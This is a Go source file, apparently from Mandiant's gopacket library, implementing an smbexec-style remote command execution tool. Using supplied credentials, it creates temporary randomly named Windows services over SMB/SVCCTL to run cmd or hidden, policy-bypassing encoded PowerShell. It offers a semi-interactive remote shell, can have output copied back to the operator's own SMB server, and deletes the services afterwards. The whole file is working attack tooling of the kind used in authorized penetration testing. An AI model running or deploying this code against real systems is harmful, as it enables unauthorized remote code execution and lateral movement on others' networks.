// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/rs/zerolog"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/svcctl"
	"github.com/mandiant/gopacket/pkg/flags"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/smb"
	"github.com/mandiant/gopacket/pkg/transport"
)

var (
	noOutput    = flag.Bool("nooutput", false, "Don't retrieve command output")
	share       = flag.String("share", "C$", "Share to use for output retrieval (default C$)")
	mode        = flag.String("mode", "SHARE", "Mode to use: SHARE or SERVER (SERVER needs root!)")
	serviceName = flag.String("service-name", "", "The name of the service used to trigger the payload")
	shellType   = flag.String("shell-type", "cmd", "Choose a command processor for the semi-interactive shell")
	codec       = flag.String("codec", "", "Output encoding (e.g., cp850, utf-8). If not set, uses raw bytes")
	timeout     = flag.Int("timeout", 30, "Timeout in seconds waiting for command output")
)

const (
	outputFilename = "__output"
	smbServerShare = "TMP"
	smbServerDir   = "__tmp"
)

func main() {
	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error parsing target string: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	// Validate mode
	modeUpper := strings.ToUpper(*mode)
	if modeUpper != "SHARE" && modeUpper != "SERVER" {
		fmt.Fprintf(os.Stderr, "[-] Invalid mode '%s'. Must be SHARE or SERVER.\n", *mode)
		os.Exit(1)
	}
	*mode = modeUpper

	// Setup Logging
	log := zerolog.New(os.Stderr)
	if !opts.Debug {
		log = zerolog.New(io.Discard)
	}

	// Connect via SMB
	log.Info().Msgf("Connecting to %s via SMB...", target.Host)
	smbClient := smb.NewClient(target, &creds)
	if err := smbClient.Connect(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] SMB connection failed: %v\n", err)
		os.Exit(1)
	}
	defer smbClient.Close()

	// Open SVCCTL pipe
	svcPipe, err := smbClient.OpenPipe("svcctl")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open svcctl pipe: %v\n", err)
		os.Exit(1)
	}
	defer svcPipe.Close()

	// Bind SVCCTL
	svcRPC := dcerpc.NewClient(svcPipe)
	if err := svcRPC.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to bind svcctl: %v\n", err)
		os.Exit(1)
	}

	sc, err := svcctl.NewServiceController(svcRPC)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to create service controller: %v\n", err)
		os.Exit(1)
	}
	defer sc.Close()

	// In SHARE mode, mount the share for output retrieval
	// In SERVER mode, we get output via the local SMB server directory
	if *mode == "SHARE" {
		if err := smbClient.UseShare(*share); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to access share %s: %v\n", *share, err)
			os.Exit(1)
		}
	}

	// In SERVER mode, determine attacker IP and set up local output directory
	var serverLocalIP string
	if *mode == "SERVER" {
		// Determine our IP address as seen by the target
		serverLocalIP = getLocalIP(target.Host)
		if serverLocalIP == "" {
			fmt.Fprintf(os.Stderr, "[-] Could not determine local IP for SERVER mode\n")
			os.Exit(1)
		}

		// Create local directory for receiving output
		if err := os.MkdirAll(smbServerDir, 0755); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to create local directory %s: %v\n", smbServerDir, err)
			os.Exit(1)
		}

		fmt.Fprintf(os.Stderr, "[*] SERVER mode: output will be received via \\\\%s\\%s\n", serverLocalIP, smbServerShare)
		fmt.Fprintf(os.Stderr, "[!] SERVER mode requires a local SMB server sharing '%s' as '%s' on port 445 (needs root)\n", smbServerDir, smbServerShare)
		fmt.Fprintf(os.Stderr, "[!] Start one with: sudo impacket-smbserver %s %s -smb2support\n", smbServerShare, smbServerDir)
	}

	// Create executor
	executor := &SMBExec{
		sc:            sc,
		smbClient:     smbClient,
		share:         *share,
		mode:          *mode,
		serviceName:   *serviceName,
		shellType:     *shellType,
		noOutput:      *noOutput,
		timeout:       *timeout,
		log:           log,
		serverLocalIP: serverLocalIP,
	}

	// Get command
	command := opts.Command()
	if command == "" {
		executor.interactiveShell()
	} else {
		output, err := executor.execute(command)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Execution failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Print(output)
	}
}

// SMBExec handles remote command execution via SCM
type SMBExec struct {
	sc            *svcctl.ServiceController
	smbClient     *smb.Client
	share         string
	mode          string
	serviceName   string
	shellType     string
	noOutput      bool
	timeout       int
	log           zerolog.Logger
	serverLocalIP string
}

func (e *SMBExec) interactiveShell() {
	fmt.Println("[!] Launching semi-interactive shell - Careful what you execute")
	fmt.Println("[!] Press Ctrl+D or type 'exit' to quit")
	fmt.Println("[!] Type '!command' to run local commands")

	// Get initial prompt by running 'cd'
	prompt := "C:\\Windows\\system32>"
	if output, err := e.execute("cd"); err == nil {
		output = strings.TrimSpace(output)
		if output != "" {
			prompt = strings.ReplaceAll(output, "\r\n", "") + ">"
		}
	}

	if e.shellType == "powershell" {
		prompt = "PS " + prompt + " "
	}

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print(prompt)
		if !scanner.Scan() {
			fmt.Println()
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}
		if strings.EqualFold(cmd, "exit") {
			break
		}

		// Local shell escape - like Impacket's ! prefix
		if strings.HasPrefix(cmd, "!") {
			localCmd := strings.TrimPrefix(cmd, "!")
			if localCmd == "" {
				fmt.Println("[!] Usage: !command - runs command on local system")
				continue
			}
			out, err := exec.Command("sh", "-c", localCmd).CombinedOutput()
			if err != nil {
				fmt.Fprintf(os.Stderr, "[-] Local command error: %v\n", err)
			}
			fmt.Print(string(out))
			continue
		}

		// Handle CD - update prompt (smbexec can't really CD but we track it)
		if strings.HasPrefix(strings.ToLower(cmd), "cd") {
			output, err := e.execute(cmd + " & cd")
			if err == nil {
				lines := strings.Split(strings.TrimSpace(output), "\r\n")
				if len(lines) > 0 {
					lastLine := strings.TrimSpace(lines[len(lines)-1])
					if strings.Contains(lastLine, ":\\") || strings.Contains(lastLine, ":/") {
						prompt = lastLine + ">"
						if e.shellType == "powershell" {
							prompt = "PS " + prompt + " "
						}
					}
				}
			}
			continue
		}

		output, err := e.execute(cmd)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
			continue
		}
		fmt.Print(output)
	}

	// Cleanup
	e.finish()
}

func (e *SMBExec) execute(data string) (string, error) {
	// Generate random names
	batchFile := generateRandomString(8) + ".bat"

	// Build the output path using UNC notation
	// This writes to \\%COMPUTERNAME%\SHARE\__output
	outputPath := fmt.Sprintf("\\\\%%COMPUTERNAME%%\\%s\\%s", e.share, outputFilename)

	// Shell prefix
	shell := "%COMSPEC% /Q /c "

	var command string
	if e.shellType == "powershell" {
		// Use Base64 encoding for PowerShell commands (more reliable like Impacket)
		psCommand := "$ProgressPreference='SilentlyContinue';" + data
		encoded := encodeUTF16LEBase64(psCommand)
		psPrefix := "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc "

		// Create batch content: powershell ... > output
		batchContent := psPrefix + encoded + " > " + outputPath + " 2>&1"

		// Echo the batch content to a file, then run it
		command = shell + "echo " + escapeForEcho(batchContent) + " > %" + "TEMP" + "%\\" + batchFile + " & " +
			shell + "%" + "TEMP" + "%\\" + batchFile
	} else {
		// Standard cmd execution
		// The service command creates a batch file on-the-fly using echo, then runs it
		// Format: %COMSPEC% /Q /c echo (COMMAND) ^> OUTPUT 2^>^&1 > BATCH & %COMSPEC% /Q /c BATCH & del BATCH
		// We wrap command in parentheses so redirection applies to the whole command chain
		command = shell + "echo (" + escapeForEcho(data) + ") ^> " + outputPath + " 2^>^&1 > %" + "TEMP" + "%\\" + batchFile + " & " +
			shell + "%" + "TEMP" + "%\\" + batchFile
	}

	// In SERVER mode, append a copy command to send output back to attacker's SMB server
	// (matches Impacket's self.__copyBack behavior)
	if e.mode == "SERVER" {
		command += " & copy " + outputPath + " \\\\" + e.serverLocalIP + "\\" + smbServerShare
	}

	// Delete batch file
	command += " & del %" + "TEMP" + "%\\" + batchFile

	e.log.Debug().Msgf("Executing command: %s", command)

	// Generate service name if not specified
	svcName := e.serviceName
	if svcName == "" {
		svcName = generateRandomString(8)
	}

	// Create service
	svcHandle, err := e.sc.CreateService(svcName, svcName, command,
		svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)

	if err != nil {
		// Service might already exist - try to delete and recreate
		if strings.Contains(err.Error(), "0x00000431") {
			h, openErr := e.sc.OpenService(svcName, svcctl.SERVICE_ALL_ACCESS)
			if openErr == nil {
				e.sc.DeleteService(h)
				e.sc.CloseServiceHandle(h)
			}

			// Retry with different name
			svcName = generateRandomString(8)
			svcHandle, err = e.sc.CreateService(svcName, svcName, command,
				svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)
		}

		if err != nil {
			return "", fmt.Errorf("create service failed: %v", err)
		}
	}

	// Start the service - this will fail with timeout but the command executes
	_ = e.sc.StartService(svcHandle)

	// Delete and close the service handle
	e.sc.DeleteService(svcHandle)
	e.sc.CloseServiceHandle(svcHandle)

	// Retrieve output
	if e.noOutput {
		return "", nil
	}

	return e.getOutput()
}

func (e *SMBExec) getOutput() (string, error) {
	if e.mode == "SERVER" {
		return e.getOutputServer()
	}
	return e.getOutputShare()
}

func (e *SMBExec) getOutputShare() (string, error) {
	var content string

	// Poll for output file with configurable timeout
	maxIterations := e.timeout * 10 // 100ms intervals
	for i := 0; i < maxIterations; i++ {
		time.Sleep(100 * time.Millisecond)

		c, err := e.smbClient.Cat(outputFilename)
		if err == nil {
			// Cat succeeds even while the remote process is still writing;
			// Rm is what fails with a sharing violation in that case.
			if rmErr := e.smbClient.Rm(outputFilename); rmErr != nil && smb.IsSharingViolation(rmErr) {
				e.log.Debug().Msg("Output file in use, waiting...")
				continue
			}
			content = c
			break
		}

		// File not yet created — keep waiting a bit.
		if smb.IsNotFound(err) {
			continue
		}

		// Other error - log and continue
		e.log.Debug().Msgf("Error reading output: %v", err)
	}

	return content, nil
}

func (e *SMBExec) getOutputServer() (string, error) {
	// In SERVER mode, the target copies output to our local SMB server directory
	localPath := filepath.Join(smbServerDir, outputFilename)

	// Poll for the output file on local disk
	maxIterations := e.timeout * 10 // 100ms intervals
	for i := 0; i < maxIterations; i++ {
		time.Sleep(100 * time.Millisecond)

		data, err := os.ReadFile(localPath)
		if err == nil {
			// Remove the local file
			os.Remove(localPath)
			return string(data), nil
		}

		if !os.IsNotExist(err) {
			e.log.Debug().Msgf("Error reading local output: %v", err)
		}
	}

	return "", nil
}

func (e *SMBExec) finish() {
	// Cleanup - try to delete any leftover output file
	if e.mode == "SHARE" {
		e.smbClient.Rm(outputFilename)
	} else {
		// SERVER mode: clean up local directory
		os.Remove(filepath.Join(smbServerDir, outputFilename))
		os.Remove(smbServerDir)
	}

	// Try to delete any leftover service
	if e.serviceName != "" {
		h, err := e.sc.OpenService(e.serviceName, svcctl.SERVICE_ALL_ACCESS)
		if err == nil {
			e.sc.DeleteService(h)
			e.sc.CloseServiceHandle(h)
		}
	}
}

// getLocalIP determines the local IP address used to reach the target host.
// Under -proxy the concept doesn't apply (traffic flows via the proxy, not
// directly from this host), so we return "" and let the caller fall back.
// The UDP socket here doesn't actually send packets — it just asks the kernel
// which source address would be picked for a hypothetical connection.
func getLocalIP(targetHost string) string {
	if transport.IsProxyConfigured() {
		return ""
	}
	conn, err := net.Dial("udp", targetHost+":445")
	if err != nil {
		return ""
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// escapeForEcho escapes special characters for echo command
// This is an improvement over Impacket which doesn't escape all characters
func escapeForEcho(s string) string {
	// Escape characters that have special meaning in cmd.exe
	// The ^ character escapes the next character
	// Order matters: escape ^ first, then others
	s = strings.ReplaceAll(s, "^", "^^")
	s = strings.ReplaceAll(s, "&", "^&")
	s = strings.ReplaceAll(s, "|", "^|")
	s = strings.ReplaceAll(s, "<", "^<")
	s = strings.ReplaceAll(s, ">", "^>")
	s = strings.ReplaceAll(s, "(", "^(")
	s = strings.ReplaceAll(s, ")", "^)")
	return s
}

// encodeUTF16LEBase64 encodes a string to UTF-16LE and then Base64
// This is how PowerShell's -EncodedCommand expects input
func encodeUTF16LEBase64(s string) string {
	// Convert to UTF-16LE
	utf16Chars := utf16.Encode([]rune(s))
	bytes := make([]byte, len(utf16Chars)*2)
	for i, c := range utf16Chars {
		bytes[i*2] = byte(c)
		bytes[i*2+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

// generateRandomString generates a random alphanumeric string
func generateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	rand.Read(b)
	for i := range b {
		b[i] = chars[int(b[i])%len(chars)]
	}
	return string(b)
}
